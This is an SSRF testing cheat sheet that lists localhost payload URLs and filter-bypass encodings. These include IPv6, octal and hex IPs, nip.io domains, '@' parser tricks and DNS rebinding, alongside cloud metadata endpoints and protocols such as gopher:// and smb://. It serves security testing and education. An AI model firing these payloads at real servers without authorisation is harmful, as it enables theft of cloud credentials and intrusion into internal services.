SSRF (Server-Side Request Forgery) arises when a server makes internal or external requests to third-party services without properly validating the URL schema. This can allow an attacker to access internal infrastructure, perform port scanning, and potentially leak sensitive metadata like AWS or GCP instance credentials.

## When to Test
* File fetchers (?url=)
* PDF/image converters
* Webhooks, integrations
* Import functions
* -based redirections
* Open Graph preview or link preview features
* Via Referrer 

# Common Payloads
```
http://127.0.0.1
http://127.0.0.1:80
http://localhost
127.0.0.1
localhost
http://127.1
http://127.0.0.1:{PORT}
http://[::]:80/
```
# Common Bypasses:
With [::], abuses IPv6 to exploit
 - http://[::]/
 - http://[::]:80/
 - http://0000::1/
 - http://0000::1:80/
   
With domain redirection, useful when all IP addresses are blacklisted
 - http://localtest.me
 - http://test.app.127.0.0.1.nip.io
 - httP://test.app.127.0.0.1.xip.io

**Case Sensitivy:**
  - HttP://127.0.0.1/
  - hTTp://LoCALHosT

Against weak parsers (these go to http://127.2.2.2:80)

* http://127.1.1.1:80@127.2.2.2:80/
* http://127.1.1.1:80@@127.2.2.2:80/
* http://127.1.1.1:80:@@127.2.2.2:80/
* http://127.1.1.1:80#@127.2.2.2:80/

**DNS ReBinDing:**

DNS rebinding is a technique where a domain (e.g., attacker.com) resolves to a public IP on the first request, then rebinds to a private/internal IP (like 127.0.0.1) on the second. This tricks the server/browser into making requests to internal services, bypassing IP-based protections.

Use case:
Bypass SSRF filters that only allow external domains.

Example:
attacker.com → 123.123.123.123 → 127.0.0.1

**Punycode Varients:**
* http://①②⑦.⓪.⓪.①/
* http://⓵⓶⓻.⓪.⓪.⓵/

**IPv6 Format**

Use IPv6-mapped IPv4 address:

http://[::ffff:127.0.0.1]/

**Octal**

Each octet in octal (prefix 0):

0177.0000.0000.0001

**Hexadecimal**

Each octet in hex (prefix 0x):
0x7f.0x00.0x00.0x01

Or full IP as one hex:
0x7f000001

# Targets of Interest
## Cloud metadata:

* AWS: http://169.254.169.254/latest/meta-data/
* GCP: http://metadata.google.internal/computeMetadata/v1/
* Azure: http://169.254.169.254/metadata/instance

## Internal services:

* http://localhost:8000/
* http://redis:6379
* http://internal-dashboard/

**Different Protocals To exfiltrate Information:**

* file:// → read local files
* ftp:// → trick server into sending file contents
* gopher:// → send custom TCP payloads (e.g., Redis injection)
* smb:// → exfiltrate NTLM hash
* dict:// → detect open ports
* http:// → access internal web apps and metadata services
* ldap:// → interact with internal LDAP services
* telnet:// → connect to telnet ports
* mysql:// → trigger DB connections if drivers are enabled



  




